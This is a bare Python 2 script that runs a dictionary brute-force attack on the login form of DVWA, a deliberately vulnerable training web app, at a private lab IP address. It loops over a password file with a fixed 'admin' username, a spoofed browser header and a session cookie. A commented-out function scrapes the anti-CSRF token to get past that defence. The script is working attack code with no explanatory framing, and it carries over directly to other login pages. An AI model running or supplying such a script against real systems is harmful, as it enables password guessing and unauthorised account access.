from bs4 import BeautifulSoup
import urllib2
import os
import time
header={'Host': '192.168.137.128',
		'Cache-Control': 'max-age=0',
		'If-None-Match': "307-52156c6a290c0",
		'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT',
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
		'Accept': '*/*',
		'Referer': 'http://192.168.153.130/dvwa/vulnerabilities/brute',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'zh-CN,zh;q=0.8',
		'Cookie': 'security=low; PHPSESSID=2fa9ovflih6r0oe7s0a8or9392'}
requrl = "http://192.168.137.128/dvwa/vulnerabilities/brute/"


#def get_token(requrl,header):
	#req = urllib2.Request(url=requrl,headers=header)
	#response = urllib2.urlopen(req)
	#print response.getcode(),
	#the_page = response.read()
	#print len(the_page)
	#soup = BeautifulSoup(the_page,"html.parser")
	#user_token = soup.form.input.input.input.input["value"] #get the user_token
	#return user_token
def get_code(requrl,header):
	req = urllib2.Request(url=requrl, headers=header)
	response = urllib2.urlopen(req)
	print response.getcode(),
	the_page = response.read()
	print len(the_page)
#user_token = get_token(requrl,header)
i=0
for line in open("password.txt"):
	requrl = "http://192.168.137.128/dvwa/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login"
	time.sleep(20)
	i = i+1
	print i,'admin',line.strip(),
	code = get_code(requrl,header)
	#user_token = get_token(requrl,header)
	#if (i == 20):
		#break